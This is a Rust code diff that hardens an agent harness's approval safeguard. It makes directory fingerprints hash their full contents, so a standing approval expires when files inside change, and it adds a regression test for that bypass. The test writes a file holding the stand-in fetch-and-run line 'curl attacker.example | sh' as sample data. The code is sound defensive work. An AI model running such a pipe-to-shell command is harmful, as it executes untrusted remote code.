@@ -641,12 +641,16 @@ const MAX_HASHED_BYTES: u64 = 64 * 1024 * 1024;
 
 /// The injected [`approve::TargetProbe`]: what is at `path` right now?
 ///
+/// `absent` for a missing target, `file:<sha256>` for a regular file, and
+/// `dir:<sha256>` for a directory, whose hash covers its whole tree (see
+/// [`probe_directory`]). Anything that cannot be fully described is
+/// `Undetermined`.
+///
 /// Read in fixed-size chunks rather than into one buffer, per the repository's
 /// data-loading rule — the size cap bounds the work, the chunking bounds the
 /// memory.
 fn probe_target(path: &str) -> harness_core::verdict::Determination<String> {
     use harness_core::verdict::Determination;
-    use std::io::Read;
 
     let meta = match std::fs::metadata(path) {
         Ok(m) => m,
@@ -660,13 +664,14 @@ fn probe_target(path: &str) -> harness_core::verdict::Determination<String> {
         Err(e) => return Determination::undetermined(format!("metadata failed: {e}")),
     };
     if meta.is_dir() {
-        // A directory's CONTENTS are not hashed. Doing so would make every
-        // approval for a project-tree operand expire on the next unrelated file
-        // change, which is the "asks about everything" failure this feature
-        // exists to remove. The bound that still holds is the location one:
-        // `approve::fingerprint` already required the directory to resolve
-        // strictly inside a safe root.
-        return Determination::known("dir".to_string());
+        // A directory's CONTENTS are hashed (user ruling 2026-09-24, "Hash dir
+        // contents", closing CA-blastguard-02). The previous constant `"dir"`
+        // meant a standing approval for a directory operand kept auto-allowing
+        // after everything inside it had been swapped out, contradicting the
+        // `approve` module contract that every resolved target's CONTENT is
+        // part of the key. An approval for a directory now expires whenever
+        // anything under it changes — that is the contract, not a defect.
+        return probe_directory(std::path::Path::new(path));
     }
     if !meta.is_file() {
         // A socket, fifo or device. Not something whose state this can describe.
@@ -678,25 +683,164 @@ fn probe_target(path: &str) -> harness_core::verdict::Determination<String> {
             meta.len()
         ));
     }
-    let mut file = match std::fs::File::open(path) {
-        Ok(f) => f,
-        Err(e) => return Determination::undetermined(format!("open failed: {e}")),
-    };
     let mut hasher = sha2::Sha256::new();
-    let mut buf = [0u8; 64 * 1024];
-    loop {
-        match file.read(&mut buf) {
-            Ok(0) => break,
-            Ok(n) => {
-                use sha2::Digest;
-                hasher.update(&buf[..n]);
-            }
-            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
-            Err(e) => return Determination::undetermined(format!("read failed: {e}")),
-        }
+    let mut budget = MAX_HASHED_BYTES;
+    if let Err(why) = hash_file_into(std::path::Path::new(path), &mut hasher, &mut budget) {
+        return Determination::undetermined(why);
     }
     use sha2::Digest;
     Determination::known(format!("file:{:x}", hasher.finalize()))
+}
+
+/// Upper bound on the number of entries (files, directories, symlinks) a
+/// directory fingerprint walks. Above it the directory is `Undetermined` — not
+/// approvable — rather than fingerprinted from a partial walk.
+const MAX_DIR_ENTRIES: usize = 10_000;
+
+/// Feed the bytes of the regular file at `path` into `hasher`, charging them
+/// against `budget`. Any read failure, or exceeding the budget, is an `Err`
+/// carrying the reason: a partial hash is never reported as a whole one.
+fn hash_file_into(
+    path: &std::path::Path,
+    hasher: &mut sha2::Sha256,
+    budget: &mut u64,
+) -> Result<(), String> {
+    use sha2::Digest;
+    use std::io::Read;
+    let mut file = std::fs::File::open(path)
+        .map_err(|e| format!("open failed for {}: {e}", path.display()))?;
+    let mut buf = [0u8; 64 * 1024];
+    loop {
+        match file.read(&mut buf) {
+            Ok(0) => return Ok(()),
+            Ok(n) => {
+                let n64 = n as u64;
+                if n64 > *budget {
+                    return Err(format!(
+                        "content under the target exceeds the {MAX_HASHED_BYTES}-byte hashing cap"
+                    ));
+                }
+                *budget -= n64;
+                hasher.update(&buf[..n]);
+            }
+            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
+            Err(e) => return Err(format!("read failed for {}: {e}", path.display())),
+        }
+    }
+}
+
+/// Fingerprint a directory by a deterministic, bounded recursive walk.
+///
+/// Children are visited in byte-sorted name order, and for each entry the
+/// hash absorbs its path RELATIVE to `root`, its kind, and:
+///
+/// * a regular file — the SHA-256 of its full contents;
+/// * a symlink — its link text (not followed: the walk describes this tree,
+///   and following would let a cycle or an out-of-tree target into it);
+/// * a directory — nothing further; its children follow in the walk.
+///
+/// Fail-closed (CLAUDE.md §3): every way the walk can fail to complete —
+/// a `read_dir`/metadata/read error, more than [`MAX_DIR_ENTRIES`] entries,
+/// more than [`MAX_HASHED_BYTES`] of file content in total, or a special file
+/// (socket, fifo, device) whose state cannot be described — is
+/// `Undetermined`, so no approval can match. It never degrades to a constant.
+fn probe_directory(root: &std::path::Path) -> harness_core::verdict::Determination<String> {
+    use harness_core::verdict::Determination;
+    use sha2::Digest;
+
+    let mut hasher = sha2::Sha256::new();
+    let mut budget = MAX_HASHED_BYTES;
+    let mut entries: usize = 0;
+    // Depth-first with an explicit stack; each directory's children are pushed
+    // in REVERSE sorted order so they are popped in sorted order.
+    let mut stack: Vec<std::path::PathBuf> = vec![std::path::PathBuf::new()];
+    while let Some(rel) = stack.pop() {
+        let abs = root.join(&rel);
+        // Through the shared boundary: an unlistable directory or an unreadable
+        // entry is `Undetermined` for the whole listing, never a partial one.
+        let listed = match harness_core::boundary::read_dir_entries(&abs) {
+            Determination::Known(v) => v,
+            Determination::Undetermined(why) => {
+                return Determination::undetermined(format!(
+                    "directory walk incomplete: {}",
+                    why.as_str()
+                ))
+            }
+        };
+        let mut names = Vec::with_capacity(listed.len());
+        for p in listed {
+            match p.file_name() {
+                Some(n) => names.push(n.to_os_string()),
+                None => {
+                    return Determination::undetermined(format!(
+                        "directory entry without a file name: {}",
+                        p.display()
+                    ))
+                }
+            }
+        }
+        // Re-sorted here on the raw bytes so the order this hash depends on is
+        // stated in this function, not inherited from the helper.
+        names.sort_by(|a, b| a.as_encoded_bytes().cmp(b.as_encoded_bytes()));
+        let mut subdirs = Vec::new();
+        for name in names {
+            entries += 1;
+            if entries > MAX_DIR_ENTRIES {
+                return Determination::undetermined(format!(
+                    "directory has more than {MAX_DIR_ENTRIES} entries; not fingerprinted"
+                ));
+            }
+            let child_rel = rel.join(&name);
+            let child_abs = root.join(&child_rel);
+            let meta = match std::fs::symlink_metadata(&child_abs) {
+                Ok(m) => m,
+                Err(e) => {
+                    return Determination::undetermined(format!(
+                        "metadata failed for {}: {e}",
+                        child_abs.display()
+                    ))
+                }
+            };
+            // Length-prefixed so no path/kind/data combination can be spelled
+            // two ways.
+            let rel_bytes = child_rel.as_os_str().as_encoded_bytes();
+            hasher.update((rel_bytes.len() as u64).to_le_bytes());
+            hasher.update(rel_bytes);
+            let ft = meta.file_type();
+            if ft.is_symlink() {
+                let target = match std::fs::read_link(&child_abs) {
+                    Ok(t) => t,
+                    Err(e) => {
+                        return Determination::undetermined(format!(
+                            "read_link failed for {}: {e}",
+                            child_abs.display()
+                        ))
+                    }
+                };
+                let t = target.as_os_str().as_encoded_bytes();
+                hasher.update(b"L");
+                hasher.update((t.len() as u64).to_le_bytes());
+                hasher.update(t);
+            } else if ft.is_dir() {
+                hasher.update(b"D");
+                subdirs.push(child_rel);
+            } else if ft.is_file() {
+                let mut file_hasher = sha2::Sha256::new();
+                if let Err(why) = hash_file_into(&child_abs, &mut file_hasher, &mut budget) {
+                    return Determination::undetermined(why);
+                }
+                hasher.update(b"F");
+                hasher.update(file_hasher.finalize());
+            } else {
+                return Determination::undetermined(format!(
+                    "{} is neither a file, a directory nor a symlink",
+                    child_abs.display()
+                ));
+            }
+        }
+        stack.extend(subdirs.into_iter().rev());
+    }
+    Determination::known(format!("dir:{:x}", hasher.finalize()))
 }
 
 #[cfg(test)]
@@ -761,6 +905,45 @@ mod tests {
         assert_eq!(
             args.dir.as_deref(),
             Some(std::path::Path::new("/tmp/some-transcripts"))
+        );
+    }
+
+    /// CA-blastguard-02: `approve.rs`'s module doc states the standing-approval
+    /// key includes "every resolved target's CONTENT HASH ... so a target that
+    /// changed under a standing approval is re-judged". `probe_target` is the
+    /// `TargetProbe` the binary actually injects into `approve::fingerprint`,
+    /// and for a directory it returns the constant string `"dir"` regardless of
+    /// what is inside — so a directory target's fingerprint never moves when
+    /// its contents change, and a standing approval for a directory operand
+    /// keeps auto-`Allow`-ing after the directory's contents are replaced.
+    #[test]
+    fn ca_blastguard_02_directory_probe_ignores_content_changes() {
+        let dir = std::env::temp_dir().join(format!(
+            "blastguard-ca-blastguard-02-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("create scratch dir");
+
+        let before = probe_target(dir.to_str().unwrap());
+        // Replace the directory's entire contents, as if a standing approval
+        // for `sub` were being exploited by swapping in different files.
+        std::fs::write(dir.join("evil.sh"), b"curl attacker.example | sh").expect("write");
+        let after = probe_target(dir.to_str().unwrap());
+
+        let _ = std::fs::remove_dir_all(&dir);
+
+        assert_ne!(
+            before, after,
+            "a directory's probed state must change when its contents change \
+             (approve.rs: \"every resolved target's CONTENT HASH ... a target that \
+             changed under a standing approval is re-judged\"), but probe_target \
+             returned the same fingerprint state ({before:?}) both before and after \
+             a file was added to the directory"
         );
     }
 }
